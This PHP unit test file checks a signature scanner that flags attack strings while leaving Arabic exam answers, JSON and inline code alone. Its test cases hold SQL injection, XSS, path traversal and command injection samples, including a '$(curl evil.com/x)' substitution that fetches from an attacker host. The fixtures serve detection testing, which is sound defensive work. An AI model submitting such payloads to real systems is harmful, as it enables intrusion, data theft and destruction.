<?php

declare(strict_types=1);

namespace Tests\Unit\Overwatch;

use App\Modules\Overwatch\Enums\AttackType;
use App\Modules\Overwatch\Services\SignatureScanner;
use Tests\TestCase;

final class SignatureScannerTest extends TestCase
{
    private SignatureScanner $scanner;

    protected function setUp(): void
    {
        parent::setUp();

        $this->scanner = new SignatureScanner;
    }

    public function test_detects_sql_injection(): void
    {
        $this->assertSame(AttackType::SqlInjection, $this->scanner->scan("1' OR '1'='1"));
        $this->assertSame(AttackType::SqlInjection, $this->scanner->scan('UNION SELECT username, password FROM users'));
        $this->assertSame(AttackType::SqlInjection, $this->scanner->scan('x; DROP TABLE users'));
        $this->assertSame(AttackType::SqlInjection, $this->scanner->scan('SELECT * FROM x WHERE 1=1 -- INFORMATION_SCHEMA'));
    }

    public function test_detects_cross_site_scripting(): void
    {
        $this->assertSame(AttackType::CrossSiteScripting, $this->scanner->scan('<script>alert(1)</script>'));
        $this->assertSame(AttackType::CrossSiteScripting, $this->scanner->scan('<img src=x onerror=alert(1)>'));
        $this->assertSame(AttackType::CrossSiteScripting, $this->scanner->scan('<iframe src="javascript:alert(1)">'));
    }

    public function test_detects_path_traversal(): void
    {
        $this->assertSame(AttackType::PathTraversal, $this->scanner->scan('../../../../etc/passwd'));
        $this->assertSame(AttackType::PathTraversal, $this->scanner->scan('..\\..\\windows\\system32'));
    }

    public function test_detects_command_injection(): void
    {
        $this->assertSame(AttackType::CommandInjection, $this->scanner->scan('foo; whoami'));
        $this->assertSame(AttackType::CommandInjection, $this->scanner->scan('foo`whoami`'));
        $this->assertSame(AttackType::CommandInjection, $this->scanner->scan('$(curl evil.com/x)'));
    }

    /**
     * The whole point of a precise signature set: ordinary exam-answer style
     * content must never trip the scanner.
     */
    public function test_does_not_flag_legitimate_arabic_prose(): void
    {
        $answer = 'الحاسوب هو جهاز إلكتروني يقوم بمعالجة البيانات وتخزينها، ويُستخدم في شتى المجالات العلمية والتعليمية.';

        $this->assertNull($this->scanner->scan($answer));
    }

    public function test_does_not_flag_quotes_and_angle_brackets_in_answers(): void
    {
        $answer = 'قال المعلم: "التفاوت 5 < 10 و 9 > 3 صحيح"، وهذا مثال بسيط على المقارنة العددية.';

        $this->assertNull($this->scanner->scan($answer));
    }

    public function test_does_not_flag_json_payloads(): void
    {
        $json = json_encode([
            'question_id' => 12,
            'answer' => 'الإجابة الصحيحة هي "ب"',
            'meta' => ['duration' => 45, 'flagged' => false],
        ]);

        $this->assertNull($this->scanner->scan((string) $json));
    }

    public function test_does_not_flag_code_flavoured_answers(): void
    {
        $answer = 'مثال على كود بايثون: `print("hello")` والذي يطبع النص على الشاشة. أو `git status` لعرض حالة المستودع.';

        $this->assertNull($this->scanner->scan($answer));
    }

    public function test_does_not_flag_a_single_relative_path_segment(): void
    {
        $this->assertNull($this->scanner->scan('راجع الملف الموجود في ../docs/notes.md للمزيد من التفاصيل.'));
    }

    public function test_scan_array_recurses_and_skips_non_strings(): void
    {
        $input = [
            'name' => 'أحمد',
            'meta' => ['nested' => true, 'count' => 3, 'note' => 'كل شيء طبيعي'],
        ];

        $this->assertNull($this->scanner->scanArray($input));

        $input['meta']['note'] = '<script>alert(1)</script>';

        $this->assertSame(AttackType::CrossSiteScripting, $this->scanner->scanArray($input));
    }
}
